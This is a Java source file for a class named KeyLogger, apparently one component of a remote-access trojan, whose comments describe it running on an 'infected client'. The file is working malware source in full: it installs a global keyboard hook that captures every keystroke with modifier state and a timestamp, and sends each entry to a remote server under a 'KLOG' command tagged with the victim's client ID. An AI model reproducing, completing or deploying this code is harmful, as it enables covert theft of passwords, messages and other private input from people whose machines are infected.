package client;

import java.io.IOException;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;

import de.ksquared.system.keyboard.*;
import tools.Connection;

/**
 * 
 * Handles the key logging on the infected client.
 * 
 * @author Yohan Chalier
 *
 */
public class KeyLogger extends Thread {

	/**
	 * Timestamp format
	 */
	private static final SimpleDateFormat SDF =
			new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
	
	/**
	 * The global listener, detecting events even out of Java's VM
	 */
	private static final GlobalKeyListener globalKeyListener;
	
	/**
	 * Custom listener with implemented methods
	 */
	private static final KeyListener listener;
	
	static {
		globalKeyListener = new GlobalKeyListener();
		
		listener = new KeyListener() {

			@Override
			public void keyPressed(KeyEvent arg0) {
				log(arg0.getVirtualKeyCode() + "\t" + arg0.isShiftPressed()
					+ "\t" + arg0.isAltPressed() + "\t" + arg0.isCtrlPressed());
			}

			@Override
			public void keyReleased(KeyEvent arg0) {}
			
		};
	}
	
	/**
	 * A reference to the client to check for closure
	 */
	private static Client client;
	
	public KeyLogger(Client client) {
		KeyLogger.client = client;
	}
	
	@Override
	public void run(){
						
		globalKeyListener.addKeyListener(listener);
		
		while (client.doLogKeyboard()) {
			try {
				Thread.sleep(100);
			} catch (InterruptedException e) {}
		}
		
		// Removing listener, or it would never stop
		globalKeyListener.removeKeyListener(listener);
		
	}
	
	/**
	 * Logs a key press and send it to the server
	 * 
	 * @param event The toString() representation of a KeyListener event
	 */
	private static void log(String event) {
		
		String timestamp = SDF.format(
				new Timestamp(System.currentTimeMillis()));
		String line = timestamp + "\t" + event;
		try {
			new Connection()
				  .write("KLOG " + client.getClientId(), line.getBytes());
		} catch (IOException e) {
			// TODO Remove before production
			e.printStackTrace();
		}
	}

}
